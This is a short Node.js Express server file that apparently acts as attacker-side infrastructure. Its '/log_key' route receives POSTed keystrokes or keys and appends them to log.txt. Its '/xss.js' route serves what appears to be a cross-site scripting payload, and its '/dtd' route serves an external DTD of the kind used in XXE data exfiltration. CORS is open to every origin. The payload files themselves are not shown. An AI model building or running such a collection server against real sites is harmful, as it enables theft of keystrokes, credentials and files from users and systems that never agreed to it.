const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));
const PORT = 3000;

app.get('/test', (req, res)=>{
    res.status(200);
    console.log("hellow");
    res.send("Welcome to root URL of Server");
});
app.post('/log_key', (req, res)=>{
    res.status(200);
    const key = req.body.key;
    fs.appendFile('log.txt', key + '\n', (err) => {
      if (err) {
        console.error(err);
      } else {
        console.log('Key logged to file');
      }
    });
    res.send("you are in post method");
});
app.get('/xss.js', (req, res) => {
    console.log("testing");
    res.sendFile(__dirname + '/xss.js');
  });

  app.get('/dtd', (req, res) => {
    console.log("dtd testing");
    res.setHeader('Content-Type', 'application/xml-dtd');
    res.sendFile(path.join(__dirname, 'example.dtd'));
  });

app.listen(PORT, (error) =>{
    if(!error)
        console.log("Server is Successfully Running,and App is listening on port "+ PORT)
    else 
        console.log("Error occurred, server can't start", error);
    }
);